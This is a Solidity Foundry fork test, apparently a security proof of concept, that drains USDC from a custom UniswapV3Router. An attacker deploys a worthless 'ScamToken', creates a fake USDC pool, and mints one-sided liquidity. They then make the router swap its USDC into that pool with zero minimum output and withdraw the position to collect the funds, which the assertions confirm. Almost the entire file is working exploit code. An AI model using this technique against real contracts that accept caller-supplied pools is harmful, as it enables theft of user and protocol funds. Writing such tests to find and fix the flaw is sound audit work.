// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {UniswapV3Router} from "../../src/Router.sol";
import {Mainnet, MainnetForkTest} from "./MainnetFork.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {INonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import {IQuoterV2} from "@uniswap/v3-periphery/contracts/interfaces/IQuoterV2.sol";
import {LiquidityAmounts} from "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";

contract ScamToken is ERC20 {
    constructor() ERC20("Scam", "SCAM") {
        _mint(msg.sender, 1e30);
    }
}

contract RouterTest is MainnetForkTest {
    UniswapV3Router public uniswapV3Router;
    IUniswapV3Pool public fakePool;
    ScamToken public scam;
    INonfungiblePositionManager public npm;

    uint24 internal constant FEE = 3000;
    uint256 constant SCAM_AMT = 1e24;
    int24 constant WIDTH = 50;
    address public attacker = makeAddr("attacker");

    bool internal usdcIsToken0;

    function setUp() public override {
        super.setUp();
        uniswapV3Router = new UniswapV3Router(Mainnet.V3_FACTORY, Mainnet.V3_POSITION_MANAGER);
        npm = INonfungiblePositionManager(Mainnet.V3_POSITION_MANAGER);

        deal(Mainnet.USDC, address(uniswapV3Router), 10e6);

        vm.startPrank(attacker);
        scam = new ScamToken();
        usdcIsToken0 = Mainnet.USDC < address(scam);

        //Create & initialize the fake pool
        (address token0, address token1) = usdcIsToken0 ? (Mainnet.USDC, address(scam)) : (address(scam), Mainnet.USDC);
        uint160 initSqrtPriceX96 = uint160(2 ** 96);
        address poolAddress = npm.createAndInitializePoolIfNecessary(token0, token1, FEE, initSqrtPriceX96);
        fakePool = IUniswapV3Pool(poolAddress);
        vm.stopPrank();
    }

    function test_Router() public {
        uint256 routerUsdcBefore = IERC20(Mainnet.USDC).balanceOf(address(uniswapV3Router));
        uint256 attackerUsdcBefore = IERC20(Mainnet.USDC).balanceOf(attacker);
        assertEq(routerUsdcBefore, 10e6, "router should hold 10 USDC");

        vm.startPrank(attacker);
        //Set the tick range
        (, int24 currentTick,,,,,) = fakePool.slot0();
        int24 spacing = fakePool.tickSpacing();
        int24 tickLower;
        int24 tickUpper;

        int24 compressed = currentTick / spacing;
        if (currentTick < 0 && currentTick % spacing != 0) compressed--;
        int24 aligned = compressed * spacing;

        if (usdcIsToken0) {
            //position 100% token1(scam) tick > range
            tickUpper = aligned - spacing;
            tickLower = tickUpper - spacing * WIDTH;
        } else {
            // position 100% token0(scam) tick < range
            tickLower = aligned + spacing;
            tickUpper = tickLower + spacing * WIDTH;
        }

        //approve
        scam.approve(address(npm), type(uint256).max);

        //mint the position- attacker is the liquidity provider of the pool
        INonfungiblePositionManager.MintParams memory mp = INonfungiblePositionManager.MintParams({
            token0: usdcIsToken0 ? Mainnet.USDC : address(scam),
            token1: usdcIsToken0 ? address(scam) : Mainnet.USDC,
            fee: FEE,
            tickLower: tickLower,
            tickUpper: tickUpper,
            amount0Desired: usdcIsToken0 ? 0 : SCAM_AMT,
            amount1Desired: usdcIsToken0 ? SCAM_AMT : 0,
            amount0Min: 0,
            amount1Min: 0,
            recipient: attacker,
            deadline: block.timestamp
        });
        (uint256 tokenId, uint128 liq,,) = npm.mint(mp);

        address[] memory pools = new address[](1);
        pools[0] = address(fakePool);
        //trigger the router to swap its usdc into fake pool
        UniswapV3Router.ExactInputPoolsParams memory p = UniswapV3Router.ExactInputPoolsParams({
            tokenIn: Mainnet.USDC,
            pools: pools,
            deadline: block.timestamp,
            amountIn: routerUsdcBefore,
            amountOutMinimum: 0
        });
        uniswapV3Router.exactInputPools(p);

        //recover the router's usdc from my position
        npm.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: tokenId, liquidity: liq, amount0Min: 0, amount1Min: 0, deadline: block.timestamp
            })
        );
        npm.collect(
            INonfungiblePositionManager.CollectParams({
                tokenId: tokenId, recipient: attacker, amount0Max: type(uint128).max, amount1Max: type(uint128).max
            })
        );
        vm.stopPrank();

        assertEq(IERC20(Mainnet.USDC).balanceOf(address(uniswapV3Router)), 0, "router drained");
        uint256 attackerUsdcAfter = IERC20(Mainnet.USDC).balanceOf(attacker);
        emit log_named_uint("attacker USDC gained", attackerUsdcAfter - attackerUsdcBefore);
        assertGt(attackerUsdcAfter, attackerUsdcBefore + 9e6, "attacker captured router USDC");
    }
}
